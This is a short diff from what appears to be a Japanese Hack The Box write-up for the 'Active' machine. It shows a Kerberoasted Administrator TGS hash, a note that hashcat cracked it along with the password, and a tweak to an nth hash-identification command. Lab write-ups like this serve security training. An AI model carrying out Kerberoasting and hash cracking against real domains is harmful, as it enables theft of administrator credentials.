@@ -198,7 +198,7 @@ LDAP        10.129.246.135  389    DC               $krb5tgs$23$*Administrator$A
 `hashcat`でクラック成功！  
 administratorのパスワードは Ticketmaster1968
 ```sh
-└─$ nth -f kerberoast.txt --no-banner --no-john -a
+└─$ nth -f kerberoast.txt --no-banner --no-john
 
 $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb\Administrator*$cefbeca81ed71a21bbd4c087f79a777d$a05312107054b05348c629632b957882ffe7acc9257680e8f063450eedd5308e6ff2918b04a182f02dad8fa7042e5106f7f64b0541816bdf12fba6646f184903ad9a90c8685
 ab216ea5a7716c7413a8d86ce4e2fcad9a8853434593944be20806400b35540d6f2703f7f6e005f8c731f16e77dccf5ab24ef4c51cc8971f716221d9fe601ee39389a0d7da57c7644a62e75fc799ba35f9597ea6d3d73df1df67619e4b3a74f64f8a670eeb4e939db1775d0d568cae93c6f19d3eccea
